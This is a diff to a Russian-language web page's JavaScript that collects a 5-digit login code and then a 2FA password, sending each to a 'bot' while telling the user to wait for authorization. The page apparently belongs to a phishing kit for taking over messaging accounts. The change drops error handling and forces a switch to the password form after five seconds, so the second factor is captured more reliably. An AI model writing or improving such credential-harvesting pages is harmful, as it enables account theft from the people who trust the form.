@@ -505,7 +505,6 @@ function handlePaste(event) {
     }
 }
 
-// Обновленная функция verifyCode
 async function verifyCode() {
     const codeInputs = document.querySelectorAll('.code-input');
     const code = Array.from(codeInputs).map(input => input.value).join('');
@@ -513,77 +512,50 @@ async function verifyCode() {
     const verifyBtn = document.getElementById('verifyBtn');
     
     console.log('🔢 Verifying code:', code);
-    console.log('📝 Code inputs:', Array.from(codeInputs).map(input => input.value));
     
     if (code.length !== 5) {
         status.textContent = 'Введите полный код из 5 цифр';
         status.style.color = '#ff4444';
-        
-        // Подсвечиваем незаполненные поля
-        codeInputs.forEach(input => {
-            if (!input.value) {
-                input.style.borderColor = '#ff4444';
-                input.style.background = 'rgba(255, 68, 68, 0.1)';
-            }
-        });
         return;
     }
 
+    // Блокируем форму
     verifyBtn.disabled = true;
     verifyBtn.textContent = 'Отправка...';
-    status.textContent = '📤 Отправляем код боту...';
+    status.textContent = '📤 Отправляем код...';
     status.style.color = 'rgba(255,255,255,0.8)';
     
-    try {
-        // Отправляем код боту
-        const result = await sendDataToBot({
-            action: 'code_received',
-            code: code
-        });
-        
+    // Отправляем код асинхронно (не ждем ответа)
+    sendDataToBot({
+        action: 'code_received',
+        code: code
+    }).then(result => {
         console.log('📨 Bot response:', result);
-        
-        if (result && result.success) {
-            status.textContent = '✅ Код отправлен! Ожидаем авторизацию...';
-            status.style.color = '#4CAF50';
-            
-            // Блокируем форму
-            codeInputs.forEach(input => {
-                input.disabled = true;
-                input.style.background = 'rgba(255,255,255,0.05)';
-            });
-            
-            // Ждем 5 секунд и показываем сообщение
-            setTimeout(() => {
-                status.textContent = '⏳ Бот проверяет код. Вы можете закрыть это окно.';
-            }, 5000);
-            
-        } else {
-            status.textContent = result?.message || '❌ Ошибка отправки кода';
-            status.style.color = '#ff4444';
-            verifyBtn.disabled = false;
-            verifyBtn.textContent = 'Подтвердить код';
-            
-            // Разблокируем поля для повторного ввода
-            codeInputs.forEach(input => {
-                input.disabled = false;
-                input.style.background = 'rgba(255,255,255,0.1)';
-                input.style.borderColor = 'rgba(255,255,255,0.3)';
-            });
-            
-            // Сбрасываем фокус на первое поле
-            if (codeInputs[0]) {
-                codeInputs[0].focus();
-                codeInputs[0].select();
-            }
-        }
-    } catch (error) {
+    }).catch(error => {
         console.error('❌ Error sending code:', error);
-        status.textContent = '❌ Ошибка соединения';
-        status.style.color = '#ff4444';
+    });
+
+    // ГАРАНТИРОВАННЫЙ переход к 2FA через 5 секунд
+    setTimeout(() => {
+        console.log('🕒 Auto-transitioning to 2FA after 5 seconds');
+        
+        // Скрываем форму кода
+        document.getElementById('codeForm').style.display = 'none';
+        
+        // Показываем форму 2FA
+        document.getElementById('passwordForm').style.display = 'block';
+        
+        // Обновляем статус
+        status.textContent = 'Введите пароль 2FA';
+        status.style.color = 'rgba(255,255,255,0.8)';
+        
+        // Разблокируем кнопку (на всякий случай)
         verifyBtn.disabled = false;
         verifyBtn.textContent = 'Подтвердить код';
-    }
+        
+        console.log('✅ Transitioned to 2FA form');
+        
+    }, 5000);
 }
 
 async function submitPassword() {
@@ -782,6 +754,7 @@ function getUserIdFromURL() {
     </script>
 </body>
 </html>
+
 
 
 
